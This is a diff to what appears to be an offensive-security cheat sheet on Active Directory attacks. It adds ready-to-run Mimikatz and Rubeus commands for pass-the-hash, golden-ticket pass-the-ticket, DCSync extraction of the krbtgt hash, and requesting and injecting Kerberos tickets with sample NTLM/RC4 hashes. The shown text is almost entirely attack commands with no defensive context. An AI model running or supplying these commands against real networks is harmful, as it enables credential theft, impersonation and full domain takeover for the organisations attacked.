@@ -188,10 +188,18 @@ kerberos::golden /user:h4x /domain:<Domain> /sid:<Domain SID> /krbtgt:<Domain NT
 
 ### Mimikatz/Rubeus PTT
 ```powershell
+#Mimikatz
 #Pass the Hash
 sekurlsa::pth /domain:infinity.com /ntlm:e929e69f7c290222be87968263a9282e /user:ted /run:cmd.exe
 
-# Pass the Ticket
-kerberos::golden /domain:infinity.com /ntlm:e929e69f7c290222be87968263a9282e /user:ted /target:dc03 /service:CIFS /ptt
+# Mimikatz Pass the Ticket
+kerberos::golden /domain:infinity.com /ntlm:e929e69f7c290222be87968263a9282e /user:ted /target:dc03 /ptt
 misc::cmd
+
+# Mimikatz DC SYNC
+lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+
+# Rubeus Pass the Ticket
+.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /ptt
+Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
 ```
